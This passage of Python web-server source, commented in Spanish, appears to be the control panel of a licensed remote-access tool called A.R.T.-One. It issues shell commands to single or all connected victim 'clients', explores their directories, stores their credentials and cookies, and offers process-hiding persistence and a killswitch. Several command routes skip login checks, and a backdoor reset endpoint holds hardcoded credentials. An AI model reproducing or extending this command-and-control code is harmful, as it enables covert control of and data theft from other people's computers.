        config["LICENSE_STATUS"] = "false"
        config["LICENSE"] = ""
        config["LICENSE_EXPIRY"] = ""
        await set_config(config)
        logging.info(f"Licencia {license_key} desactivada debido a {action}")
        return jsonify({"success": True, "message": "Licencia desactivada"})

    elif action == "restore":
        config["LICENSE_STATUS"] = "true"
        await set_config(config)
        logging.info(f"Licencia {license_key} reactivada")
        return jsonify({"success": True, "message": "Licencia reactivada"})

    else:
        return jsonify({"success": False, "message": "Acción desconocida"}), 400

@app.route("/api/update_license_manager", methods=["POST"])
async def update_license_manager():
    data = await request.get_json()
    new_ip = data.get("license_manager_ip")
    new_port = data.get("license_manager_port")
    if not new_ip or not new_port:
        return jsonify({"error": "Faltan datos (IP y puerto)."}), 400
    config = await get_config()
    config["LICENSE_MANAGER_IP"] = new_ip
    config["LICENSE_MANAGER_PORT"] = str(new_port)
    await set_config(config)
    return jsonify({"success": True, "message": "License Manager IP y puerto actualizados."})

async def restart_server():
    print("[!] Restarting server to apply new configuration...")
    try:
        result = subprocess.check_output(["lsof", "-t", f"-i:{(await get_config()).get('PANEL_PORT')}"], text=True).strip()
        if result:
            subprocess.run(["kill", "-9", result], check=True)
            print("[!] Existing process killed successfully.")
    except subprocess.CalledProcessError:
        print("[!] No existing process found on the port.")
    python = sys.executable
    os.execl(python, python, *sys.argv)

@app.route("/config/logging", methods=["POST"])
@login_required
async def config_logging():
    data = await request.get_json()
    config = await get_config()
    # Update logging-related configuration
    config["LOG_LEVEL"] = data.get("log_level", "info")
    config["LOG_TO_FILE"] = "true" if data.get("log_to_file") else "false"
    config["LOG_TO_SYSLOG"] = "true" if data.get("log_to_syslog") else "false"
    config["LOG_FILE_PATH"] = data.get("log_file_path", "/var/log/art-one.log")
    config["MAX_LOG_SIZE"] = str(data.get("max_log_size", 10))
    config["LOG_ENCRYPTION"] = "true" if data.get("log_encryption") else "false"
    config["LOG_ROTATION"] = "true" if data.get("log_rotation") else "false"
    await set_config(config)
    return jsonify({"message": "Logging settings updated successfully."})

@app.route("/config/network", methods=["POST"])
@license_required
@login_required
async def config_network():
    data = await request.get_json()
    config = await get_config()
    # Update network-related configuration
    config["PROXY_TYPE"] = data.get("proxy_type", "none")
    config["PROXY_HOST"] = data.get("proxy_host", "")
    config["PROXY_PORT"] = data.get("proxy_port", "")
    config["PROXY_USERNAME"] = data.get("proxy_username", "")
    config["PROXY_PASSWORD"] = data.get("proxy_password", "")
    config["DNS_SERVER"] = data.get("dns_server", "8.8.8.8")
    config["USE_CUSTOM_DNS"] = "true" if data.get("use_custom_dns") else "false"
    config["ENABLE_KILLSWITCH"] = "true" if data.get("enable_killswitch") else "false"
    await set_config(config)
    return jsonify({"message": "Network settings updated successfully."})

@app.route("/config/persistence", methods=["POST"])
@license_required
@login_required
async def config_persistence():
    data = await request.get_json()
    config = await get_config()
    # Update persistence-related configuration
    config["SERVER_PERSISTENCE_METHOD"] = data.get("server_persistence_method", "none")
    config["RESTART_INTERVAL"] = str(data.get("restart_interval", 60))
    config["AUTO_RESTART"] = "true" if data.get("auto_restart") else "false"
    config["HIDE_PROCESS"] = "true" if data.get("hide_process") else "false"
    await set_config(config)
    # Apply persistence settings (simplified for now; you may need to implement actual persistence logic)
    if config["SERVER_PERSISTENCE_METHOD"] != "none":
        colored_print(f"[+] Applying server persistence method: {config['SERVER_PERSISTENCE_METHOD']}", "success")
    return jsonify({"message": "Persistence settings updated successfully."})

@app.route("/config/blacklist_advanced", methods=["POST"])
@license_required
@login_required
async def config_blacklist_advanced():
    data = await request.get_json()
    config = await get_config()
    # Update advanced blacklist settings
    config["BLACKLIST_THRESHOLD"] = str(data.get("blacklist_threshold", 3))
    config["AUTO_BLACKLIST"] = "true" if data.get("auto_blacklist") else "false"
    config["BLOCK_COUNTRY"] = "true" if data.get("block_country") else "false"
    config["BLOCKED_COUNTRIES"] = data.get("blocked_countries", "")
    await set_config(config)
    return jsonify({"message": "Advanced blacklist settings updated successfully."})

@app.route("/disable_2fa", methods=["POST"])
@license_required
@login_required
async def disable_2fa():
    config = await get_config()
    if config.get("2FA_ENABLED") != "true":
        return jsonify({"success": False, "message": "2FA is not enabled."}), 400
    config["2FA_ENABLED"] = "false"
    config["2FA_SECRET"] = ""
    await set_config(config)
    return jsonify({"success": True, "message": "2FA has been disabled successfully."})

@app.route("/clear_logs", methods=["POST"])
@license_required
@login_required
async def clear_logs():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("DELETE FROM logs")
        await db.commit()
    return jsonify({"message": "All logs have been cleared successfully."})

@app.route("/api/recent_logs", methods=["GET"])
@license_required
@login_required
async def api_recent_logs():
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            "SELECT id, log_type, client_mac, command, timestamp FROM logs ORDER BY id DESC LIMIT 10"
        ) as cursor:
            logs = []
            async for row in cursor:
                logs.append({
                    "id": row[0],
                    "log_type": row[1],
                    "client_mac": row[2] or "N/A",
                    "command": row[3],
                    "timestamp": row[4]
                })
    return jsonify(logs)

@app.route("/shutdown_server", methods=["POST"])
@license_required
@login_required
async def shutdown_server():
    asyncio.create_task(shutdown_server_task())
    return jsonify({"success": True, "message": "Server is shutting down..."}), 200

async def shutdown_server_task():
    print("[!] Server shutting down by admin request...")
    await asyncio.sleep(1)
    os._exit(0)

@app.route("/setup_2fa", methods=["GET"])
@license_required
@login_required
async def setup_2fa():
    config = await get_config()
    if config.get("2FA_ENABLED") == "true":
        return jsonify({"error": "2FA already configured."}), 400
    secret = pyotp.random_base32()
    totp = pyotp.TOTP(secret)
    username = config.get("USERNAME")
    uri = totp.provisioning_uri(f"{username}", issuer_name="A.R.T.-One")
    img = qrcode.make(uri)
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    qr_base64 = base64.b64encode(buffered.getvalue()).decode("utf-8")
    session["2fa_secret_temp"] = secret
    return jsonify({"qr": qr_base64})

@app.route("/verify_2fa_setup", methods=["POST"])
@license_required
@login_required
async def verify_2fa_setup():
    data = await request.get_json()
    code = data.get("code")
    secret = session.get("2fa_secret_temp")
    if not secret:
        return jsonify({"success": False, "message": "No se encontró el secreto temporal."}), 400
    totp = pyotp.TOTP(secret)
    if totp.verify(code):
        config = await get_config()
        config["2FA_ENABLED"] = "true"
        config["2FA_SECRET"] = secret
        await set_config(config)
        session.pop("2fa_secret_temp", None)
        return jsonify({"success": True, "message": "2FA configurado exitosamente."})
    else:
        return jsonify({"success": False, "message": "Código inválido, inténtalo nuevamente."}), 400
    
@app.route("/restart_server", methods=["POST"])
@license_required
@login_required
async def restart_server():
    asyncio.create_task(restart_server_task())
    return jsonify({"success": True, "message": "Server is restarting..."})

async def restart_server_task():
    print("[!] Restarting server by admin request...")
    await asyncio.sleep(1)
    try:
        config = await get_config()
        port = config.get('PANEL_PORT', '4135')
        result = subprocess.check_output(["lsof", "-t", f"-i:{port}"], text=True).strip()
        if result:
            subprocess.run(["kill", "-9", result], check=True)
            print("[!] Existing process killed successfully.")
    except subprocess.CalledProcessError:
        print("[!] No existing process found on the port.")
    python = sys.executable
    os.execl(python, python, *sys.argv)

@app.route("/reset_credentials", methods=["POST"])
async def reset_credentials():
    data = await request.get_json()
    provided_key = data.get("reset_key")
    if provided_key != SECRET_RESET_KEY:
        return jsonify({"success": False, "message": "Unauthorized"}), 403
    config = await get_config()
    config["USERNAME"] = "pillow"
    config["PASSWORD"] = hash_password("@goliath4354")
    config["2FA_ENABLED"] = "false"
    config["2FA_SECRET"] = ""
    await set_config(config)
    return jsonify({"success": True, "message": "Credenciales y 2FA reseteados con éxito."})

@app.route("/api/resources", methods=["GET"])
async def api_resources():
    cpu_percent = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage("/")
    try:
        temps = psutil.sensors_temperatures()
        cpu_temperature = temps.get("coretemp", [None])[0].current if "coretemp" in temps else 0.0
    except:
        cpu_temperature = 0.0
    global LAST_NET, LAST_TIME
    current_time = time.time()
    net = psutil.net_io_counters()
    if LAST_NET is not None:
        delta_time = current_time - LAST_TIME
        net_in_rate = (net.bytes_recv - LAST_NET.bytes_recv) / (delta_time * 1024 * 1024)
        net_out_rate = (net.bytes_sent - LAST_NET.bytes_sent) / (delta_time * 1024 * 1024)
    else:
        net_in_rate = 0.0
        net_out_rate = 0.0
    LAST_NET = net
    LAST_TIME = current_time
    data = {
        "cpu_percent": cpu_percent,
        "cpu_temperature": cpu_temperature,
        "memory_total": mem.total,
        "memory_used": mem.used,
        "memory_percent": mem.percent,
        "disk_total": disk.total,
        "disk_used": disk.used,
        "disk_percent": disk.percent,
        "network_in": round(net_in_rate, 2),
        "network_out": round(net_out_rate, 2)
    }
    return jsonify(data)

# ---------------------------
# RUTAS DE LICENCIAS
# ---------------------------
def load_public_key(path="license_public.pem"):
    with open(path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())
    return public_key

def verify_license(license_key: str) -> (bool, dict):
    try:
        parts = license_key.split(".")
        if len(parts) != 2:
            return False, {"error": "Formato incorrecto de licencia."}
        data_b64, signature_b64 = parts
        data_json = base64.urlsafe_b64decode(data_b64.encode()).decode()
        license_data = json.loads(data_json)
        signature = base64.urlsafe_b64decode(signature_b64.encode())
        public_key = load_public_key()
        public_key.verify(
            signature,
            data_json.encode(),
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        from_main = license_data.get("mac")
        local_mac = get_mac_address()
        if from_main != local_mac:
            return False, {"error": f"MAC mismatch: licencia para {from_main}, este servidor es {local_mac}"}
        expiry_str = license_data.get("expiry", "")
        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
        if expiry_date < datetime.now():
            return False, {"error": "La licencia ha caducado.", "expiry": expiry_str}
        return True, license_data
    except Exception as e:
        return False, {"error": f"Error validando la licencia: {e}"}

@app.route("/api/license_status", methods=["GET"])
async def api_license_status():
    config = await get_config()
    return jsonify({
        "license_status": config.get("LICENSE_STATUS", "false"),
        "license_expiry": config.get("LICENSE_EXPIRY", "N/A"),
        "license_key": config.get("LICENSE", "")
    })

@app.route("/api/update_license", methods=["POST"])
async def api_update_license():
    logging.info("Recibiendo solicitud para actualizar licencia")
    data = await request.get_json()
    new_license = data.get("license_key", "").strip()
    if not new_license:
        logging.warning("No se proporcionó license_key")
        return jsonify({"success": False, "message": "No license_key provided"}), 400
    
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT value FROM config WHERE key='CURRENT_LICENSE_PUBKEY'") as cursor:
            row = await cursor.fetchone()
    if not row:
        logging.error("No se encontró la clave pública en la base de datos")
        return jsonify({"success": False, "message": "No public_key stored in DB"}), 400
    public_key_pem = row[0]
    
    parts = new_license.split(".")
    if len(parts) != 2:
        logging.warning("Formato de licencia incorrecto")
        return jsonify({"success": False, "message": "Licencia con formato incorrecto"}), 400
    data_b64, signature_b64 = parts
    
    try:
        data_json = base64.urlsafe_b64decode(data_b64.encode()).decode()
        license_data = json.loads(data_json)
        signature = base64.urlsafe_b64decode(signature_b64.encode())
        public_key_obj = serialization.load_pem_public_key(public_key_pem.encode())
        public_key_obj.verify(
            signature,
            data_json.encode(),
            padding.PKCS1v15(),
            hashes.SHA256()
        )
    except Exception as e:
        logging.error(f"Error validando la licencia: {str(e)}")
        return jsonify({"success": False, "message": f"Error validando la licencia: {str(e)}"}), 400
    
    from_main = license_data.get("mac")
    local_mac = get_mac_address()
    if from_main != local_mac:
        logging.warning(f"Desajuste de MAC: licencia para {from_main}, servidor es {local_mac}")
        return jsonify({"success": False, "message": f"MAC mismatch: licencia para {from_main}, este servidor es {local_mac}"}), 400
    
    expiry_str = license_data.get("expiry", "")
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d")
        if expiry_date < datetime.datetime.now():
            logging.warning("La licencia ha caducado")
            return jsonify({"success": False, "message": "La licencia ha caducado."}), 400
    except ValueError:
        logging.warning("Formato de fecha inválido en la licencia")
        return jsonify({"success": False, "message": "Formato de fecha inválido en la licencia"}), 400
    
    config = await get_config()
    config["LICENSE"] = new_license
    config["LICENSE_STATUS"] = "true"
    config["LICENSE_EXPIRY"] = expiry_str
    await set_config(config)
    logging.info(f"Licencia actualizada con éxito, válida hasta {expiry_str}")
    return jsonify({"success": True, "message": f"Licencia actualizada, válida hasta {expiry_str}"})

async def get_license_manager_base_url() -> str:
    config = await get_config()
    lm_ip = config.get("LICENSE_MANAGER_IP", "51.83.72.254")
    lm_port = config.get("LICENSE_MANAGER_PORT", "5000")
    return f"http://{lm_ip}:{lm_port}"

async def register_self():
    try:
        # Usar api.ipify.org para obtener la IP pública IPv4
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        public_ip = response.json().get("ip")
        # Validar que sea una dirección IPv4
        if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", public_ip):
            raise ValueError(f"Obtenida una dirección no IPv4: {public_ip}")
    except Exception as e:
        public_ip = "Unknown"
        colored_print(f"[ERROR] No se pudo obtener la IP pública IPv4: {e}", "error")
    config = await get_config()
    panel_port = config.get("PANEL_PORT", "4135")
    mac = get_mac_address()
    server_version = config.get("SERVER_VERSION", "unknown")
    lm_base_url = await get_license_manager_base_url()
    license_manager_url = f"{lm_base_url}/register_server"
    data = {
        "ip": public_ip,
        "port": panel_port,
        "mac": mac,
        "version": server_version
    }
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.post(license_manager_url, json=data, timeout=5)
            response_data = response.json()
            if response.status_code == 200 and response_data.get("success"):
                break
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(5)

async def check_license_revocation_periodically():
    while True:
        await asyncio.sleep(3600)
        config = await get_config()
        license_key = config.get("LICENSE", "")
        if not license_key:
            continue
        mac = get_mac_address()
        lm_base_url = await get_license_manager_base_url()
        license_manager_url = f"{lm_base_url}/api/check_license"
        data = {"mac": mac, "license_key": license_key}
        try:
            r = requests.post(license_manager_url, json=data, timeout=5)
            res = r.json()
            if res.get("revoked", False):
                config["LICENSE_STATUS"] = "false"
                config["LICENSE"] = ""
                config["LICENSE_EXPIRY"] = ""
                await set_config(config)
                print("[!] Licencia revocada o caducada, se ha deshabilitado localmente.")
        except Exception as e:
            print(f"[!] Error checking license revocation: {e}")

@app.route("/api/update_public_key", methods=["POST"])
async def update_public_key():
    data = await request.get_json()
    pub_key = data.get("public_key")
    if not pub_key:
        return jsonify({"success": False, "error": "Missing public_key"}), 400
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("REPLACE INTO config (key, value) VALUES (?, ?)", ("CURRENT_LICENSE_PUBKEY", pub_key))
        await db.commit()
    return jsonify({"success": True, "message": "Public key updated successfully"})

# ---------------------------
# RUTAS DE LOGS
# ---------------------------
# Configurar logging
logging.basicConfig(level=logging.DEBUG, filename='artone.log', 
                    format='%(asctime)s %(levelname)s: %(message)s')

@app.route("/logs")
@license_required
@login_required
async def logs_page():
    db_logs = await get_logs()
    return await render_template("logs.html", logs=db_logs)

@app.route("/download_logs")
@license_required
@login_required
async def download_logs():
    mac_filter = request.args.get("mac")
    now = time.strftime('%Y-%m-%d_%H-%M-%S')
    if mac_filter:
        hostname = "UnknownClient"
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT info FROM clients WHERE json_extract(info, '$.MDRS') = ?", (mac_filter,)) as cursor:
                row = await cursor.fetchone()
                if row:
                    try:
                        info = json.loads(row[0])
                        hostname = info.get("HSTN", "UnknownClient")
                    except:
                        hostname = "UnknownClient"
        base_name = f"Logs_{hostname}_{now}"
    else:
        base_name = f"Logs_all_{now}"
    filename = f"{base_name}.html"
    html_lines = [
        """
        <!DOCTYPE html>
        <html lang="es">
        <head>
          <meta charset="UTF-8">
          <title>Logs - A.R.T. - One</title>
          <style>
            body { font-family: "Segoe UI", Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
            header { background: #27293d; color: #fff; padding: 20px; text-align: center; }
            header img { max-height: 60px; vertical-align: middle; }
            header h1 { display: inline; margin: 0 0 0 10px; vertical-align: middle; }
            nav#indice { background: #007bff; padding: 10px 20px; }
            nav#indice ul { list-style: none; padding: 0; margin: 0; display: flex; flex-wrap: wrap; }
            nav#indice li { margin-right: 20px; }
            nav#indice a { color: #fff; text-decoration: none; font-weight: bold; }
            main { padding: 20px; }
            section { background: #fff; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            section h2 { border-bottom: 2px solid #007bff; padding-bottom: 10px; color: #007bff; }
            details { margin-top: 10px; }
            details summary { font-size: 1.1rem; font-weight: bold; cursor: pointer; padding: 10px; background: #e9ecef; border: 1px solid #ccc; border-radius: 5px; }
            .card { background: #27293d; color: #f1f1f1; border: 1px solid #00e0ff; border-radius: 5px; padding: 15px; margin-bottom: 10px; }
            .card h4 { margin-top: 0; color: #00e0ff; }
            pre { white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; background: #1b1f3b; color: #00e0ff; padding: 10px; border-radius: 4px; }
            .search-input { width: 100%; padding: 8px; margin-bottom: 20px; border: 1px solid #00e0ff; border-radius: 4px; background: #f1f1f1; }
            footer { background: #27293d; color: #fff; text-align: center; padding: 10px; font-size: 0.9em; }
          </style>
          <script>
            function filterLogs() {
                const query = document.getElementById("searchInput").value.toLowerCase();
                const cards = document.querySelectorAll(".card");
                cards.forEach(card => {
                    if (card.innerText.toLowerCase().includes(query)) {
                        card.style.display = "block";
                    } else {
                        card.style.display = "none";
                    }
                });
            }
          </script>
        </head>
        <body>
          <header>
            <img src="https://art-one.site/source/logo_light.png" alt="A.R.T. - One Logo">
            <h1>A.R.T. - One: Logs Report</h1>
          </header>
          <nav id="indice">
            <ul>
        """
    ]
    if not mac_filter:
        html_lines.append('<li><a href="#general-logs">General Logs</a></li>')
        client_macs = set()
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT DISTINCT client_mac FROM logs WHERE log_type = 'client'") as cursor:
                async for row in cursor:
                    if row[0]:
                        client_macs.add(row[0])
        for mac in sorted(client_macs):
            section_id = f"client-{mac.replace(':', '-')}"
            html_lines.append(f'<li><a href="#{section_id}">Client {mac}</a></li>')
    html_lines.append(
        """
            </ul>
          </nav>
          <main>
            <input type="text" id="searchInput" class="search-input" onkeyup="filterLogs()" placeholder="Search logs...">
        """
    )
    if not mac_filter:
        html_lines.append(
            """
            <section id="general-logs">
              <h2>General Logs</h2>
              <details open>
                <summary>Toggle General Logs</summary>
            """
        )
        general_logs = []
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT command, response, timestamp FROM logs WHERE log_type = 'general' ORDER BY id DESC") as cursor:
                async for row in cursor:
                    general_logs.append(f"<div class='card'><h4>[{row[2]}]</h4><p><strong>Command:</strong> {row[0]}</p><p><strong>Response:</strong></p><pre>{row[1]}</pre></div>")
        if general_logs:
            html_lines.append("\n".join(general_logs))
        else:
            html_lines.append("<p>No general logs available.</p>")
        html_lines.append(
            """
              </details>
            </section>
            """
        )
    if mac_filter:
        section_id = f"client-{mac_filter.replace(':', '-')}"
        html_lines.append(
            f"""
            <section id="{section_id}">
              <h2>Client Logs for MAC: {mac_filter}</h2>
              <details open>
                <summary>Toggle Client Logs</summary>
            """
        )
        client_logs = []
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT command, response, timestamp FROM logs WHERE log_type = 'client' AND client_mac = ? ORDER BY id DESC", (mac_filter,)) as cursor:
                async for row in cursor:
                    client_logs.append(f"<div class='card'><h4>[{row[2]}]</h4><p><strong>Command:</strong> {row[0]}</p><p><strong>Response:</strong></p><pre>{row[1]}</pre></div>")
        if client_logs:
            html_lines.append("\n".join(client_logs))
        else:
            html_lines.append(f"<p>No logs found for MAC: {mac_filter}</p>")
        html_lines.append(
            """
              </details>
            </section>
            """
        )
    else:
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute("SELECT DISTINCT client_mac FROM logs WHERE log_type = 'client'") as cursor:
                async for row in cursor:
                    mac = row[0]
                    if not mac:
                        continue
                    section_id = f"client-{mac.replace(':', '-')}"
                    html_lines.append(
                        f"""
                        <section id="{section_id}">
                          <h2>Client Logs for MAC: {mac}</h2>
                          <details>
                            <summary>Toggle Logs</summary>
                        """
                    )
                    client_logs = []
                    async with db.execute("SELECT command, response, timestamp FROM logs WHERE log_type = 'client' AND client_mac = ? ORDER BY id DESC", (mac,)) as cl_cursor:
                        async for cl_row in cl_cursor:
                            client_logs.append(f"<div class='card'><h4>[{cl_row[2]}]</h4><p><strong>Command:</strong> {cl_row[0]}</p><p><strong>Response:</strong></p><pre>{cl_row[1]}</pre></div>")
                    if client_logs:
                        html_lines.append("\n".join(client_logs))
                    else:
                        html_lines.append(f"<p>No logs found for MAC: {mac}</p>")
                    html_lines.append(
                        """
                          </details>
                        </section>
                        """
                    )
    html_lines.append(
        f"""
          </main>
          <footer>
            <p>Logs generated automatically on {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>© A.R.T. - One. Todos los derechos reservados.</p>
          </footer>
        </body>
        </html>
        """
    )
    html_report = "\n".join(html_lines)
    temp_dir = tempfile.gettempdir()
    tmp_file_path = os.path.join(temp_dir, filename)
    try:
        with open(tmp_file_path, "w", encoding="utf-8") as tmp_file:
            tmp_file.write(html_report)
        if not os.path.exists(tmp_file_path):
            return jsonify({"error": "Log file not found after creation"}), 500
        response = await send_file(tmp_file_path, as_attachment=True, attachment_filename=filename, cache_timeout=0)
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        asyncio.create_task(delete_temp_file(tmp_file_path, delay=5))
        return response
    except Exception as e:
        return jsonify({"error": f"Failed to generate log file: {str(e)}"}), 500

async def delete_temp_file(file_path, delay=5):
    await asyncio.sleep(delay)
    if os.path.exists(file_path):
        os.remove(file_path)

@app.route("/logs/client", methods=["GET"])
@license_required
@login_required
async def get_client_logs():
    try:
        mac = request.args.get("mac")
        if not mac:
            return jsonify({"error": "Missing MAC parameter"}), 400

        page = int(request.args.get("page", 1))
        command_filter = request.args.get("command", "")
        response_filter = request.args.get("response", "")
        date_filter = request.args.get("date", "")
        per_page = 10
        offset = (page - 1) * per_page
        logs = []
        total = 0

        async with aiosqlite.connect(DB_FILE) as db:
            query = "SELECT command, response, timestamp FROM logs WHERE log_type = 'client' AND client_mac = ?"
            params = [mac]
            conditions = []  # Initialize conditions here
            if command_filter or response_filter or date_filter:
                if command_filter:
                    conditions.append("command LIKE ?")
                    params.append(f"%{command_filter}%")
                if response_filter:
                    conditions.append("response LIKE ?")
                    params.append(f"%{response_filter}%")
                if date_filter:
                    conditions.append("timestamp LIKE ?")
                    params.append(f"%{date_filter}%")
                query += " AND " + " AND ".join(conditions)
            query += " ORDER BY id DESC LIMIT ? OFFSET ?"
            params.extend([per_page, offset])
            async with db.execute(query, params) as cursor:
                async for row in cursor:
                    logs.append({"command": row[0], "response": row[1], "timestamp": row[2]})
            count_query = f"SELECT COUNT(*) FROM logs WHERE log_type = 'client' AND client_mac = ?{' AND ' + ' AND '.join(conditions) if conditions else ''}"
            async with db.execute(count_query, params[:-2]) as cursor:
                total = (await cursor.fetchone())[0]
        return jsonify({"logs": logs, "page": page, "total": total, "per_page": per_page})
    except Exception as e:
        print(f"[ERROR] /logs/client failed: {str(e)}")  # Log the error on the server
        return jsonify({"error": f"Server error: {str(e)}"}), 500
    
# ---------------------------
# DASHBOARD / CLIENTES
# ---------------------------
@app.route("/")
@license_required
@login_required
async def index():
    clients = await get_clients()
    config = await get_config()
    return await render_template("index.html", clients=clients, my_public_ip=config.get("SERVER_IP"), my_port=config.get("PANEL_PORT"))

async def broadcast_clients_update():
    clients = await get_clients()
    data = json.dumps(clients)
    for queue in sse_connections.copy():
        try:
            await queue.put(data)
        except Exception as e:
            print(f"Error sending SSE update: {e}")

sse_connections = set()

@app.route("/sse/clients")
@license_required
async def sse_clients():
    async def event_stream():
        q = asyncio.Queue()
        sse_connections.add(q)
        try:
            while True:
                data = await q.get()
                yield f"data: {data}\n\n"
        except asyncio.CancelledError:
            sse_connections.remove(q)
        except Exception as e:
            sse_connections.remove(q)
            print(f"SSE connection error: {e}")
    return Response(event_stream(), mimetype="text/event-stream")

@app.route("/export_clients", methods=["GET"])
@license_required
@login_required
async def export_clients():
    try:
        clients_data = await get_clients()
        timestamp = time.strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"clients_info_{timestamp}.json"
        temp_dir = tempfile.gettempdir()
        tmp_file_path = os.path.join(temp_dir, filename)
        with open(tmp_file_path, "w") as temp_file:
            json.dump(clients_data, temp_file, indent=4)
        if not os.path.exists(tmp_file_path):
            return jsonify({"error": "Export file not found after creation"}), 500
        response = await send_file(tmp_file_path, as_attachment=True, attachment_filename=filename, cache_timeout=0)
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        asyncio.create_task(delete_temp_file(tmp_file_path, delay=5))
        return response
    except Exception as e:
        print(f"[!] Error exporting clients: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/import_clients", methods=["POST"])
@license_required
@login_required
async def import_clients():
    if 'file' not in (await request.files):
        return jsonify({"error": "No file part"}), 400
    file = (await request.files).get('file')
    if not file or file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    if file.filename.endswith('.json'):
        filename = secure_filename(file.filename)
        temp_path = os.path.join(tempfile.gettempdir(), filename)
        await file.save(temp_path)
        with open(temp_path, 'r') as f:
            imported_clients = json.load(f)
        if not isinstance(imported_clients, list):
            return jsonify({"error": "Invalid file format"}), 400
        async with aiosqlite.connect(DB_FILE) as db:
            for client in imported_clients:
                client_id = client.get("id")
                ip = client.get("address")
                info = client.get("info", {})
                online = client.get("status") == "Online"
                last_seen = client.get("last_seen")
                credentials = client.get("credentials", "")
                notes = client.get("notes", "")
                tags = client.get("tags", "")
                custom_name = client.get("custom_name", f"Client #{client_id}")
                cookie = client.get("cookie", "")
                vs = client.get("version", "")
                info_json = json.dumps(info)
                await db.execute(
                    "INSERT OR REPLACE INTO clients (client_id, ip, info, online, last_seen, credentials, notes, tags, custom_name, cookie, vs) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (client_id, ip, info_json, int(online), last_seen, credentials, notes, tags, custom_name, cookie, vs)
                )
            await db.commit()
        os.remove(temp_path)
        return jsonify({"success": "Clients imported successfully!"}), 200
    else:
        return jsonify({"error": "Invalid file format. Only JSON files are allowed."}), 400

async def init_next_client_id():
    global NEXT_CLIENT_ID
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT MAX(client_id) FROM clients") as cursor:
            row = await cursor.fetchone()
            max_id = row[0] if row[0] is not None else 0
    NEXT_CLIENT_ID = max_id

# ---------------------------
# MANEJO DE COMANDOS A CLIENTES
# ---------------------------
@app.route("/clients/command_all", methods=["POST"])
@license_required
async def command_all_clients():
    body = await request.get_json()
    if not body or "command" not in body:
        return jsonify({"error": "Missing 'command'"}), 400
    cmd = body["command"].strip()
    if not cmd:
        return jsonify({"error": "Command cannot be empty"}), 400
    results = []
    for cid, sess in CLIENTS.items():
        if sess.online:
            resp = await _send_command_and_read(sess, cmd, "command_all")
            results.append({
                "client_ip": sess.address[0] if sess.address else "unknown",
                "response": resp
            })
        else:
            results.append({
                "client_ip": sess.address[0] if sess.address else "unknown",
                "response": "[SKIPPED] Offline client"
            })
    return jsonify({"results": results})

@app.route("/api/clients")
@license_required
async def api_clients():
    all_db_clients = await get_clients()
    for c in all_db_clients:
        cid = c["id"]
        if cid in CLIENTS and CLIENTS[cid].online:
            c["status"] = "Online"
        else:
            c["status"] = "Offline"
    return jsonify(all_db_clients)

@app.route("/api/client/<int:client_id>", methods=["GET"])
@license_required
@login_required
async def api_client(client_id):
    clients = await get_clients()
    client = next((c for c in clients if c["id"] == client_id), None)
    if not client:
        return jsonify({"error": "Client not found"}), 404
    return jsonify(client)

@app.route("/client/<int:client_id>/command", methods=["POST"])
@license_required
async def client_command(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    body = await request.get_json()
    cmd_text = body.get("command", "").strip()
    if not cmd_text:
        return jsonify({"error": "Empty command"}), 400
    response = await _send_command_and_read(sess, cmd_text, "single")
    return jsonify({"result": response})

@app.route("/client/<int:client_id>/execute_predefined_command", methods=["POST"])
@license_required
async def execute_predefined_command(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
        return jsonify({"error": "Client offline"}), 400
    body = await request.get_json()
    command_key = body.get("command")
    if not command_key:
        return jsonify({"error": "Missing command key"}), 400
    os_type = sess.info.get("os", "").lower()
    if "windows" in os_type:
        real_cmd = PREDEFINED_COMMANDS.get(command_key, {}).get("Windows")
    elif "linux" in os_type:
        real_cmd = PREDEFINED_COMMANDS.get(command_key, {}).get("Linux")
    elif "macos" in os_type:
        real_cmd = PREDEFINED_COMMANDS.get(command_key, {}).get("macOS")
    else:
        await insert_log("general", "", f"Unsupported OS: {os_type} for client {client_id}", "")
        return jsonify({"error": "Unsupported OS"}), 400
    if not real_cmd:
        await insert_log("general", "", f"Unknown command {command_key} for client {client_id}", "")
        return jsonify({"error": "Unknown command"}), 400
    resp = await _send_command_and_read(sess, real_cmd, "predefined")
    return jsonify({"result": resp})

@app.route("/client/<int:client_id>/explore", methods=["POST"])
@license_required
async def explore_directory(client_id):
    if client_id not in CLIENTS:
        return jsonify({"error": "Client not found"}), 404
    sess = CLIENTS[client_id]
    if not sess.online:
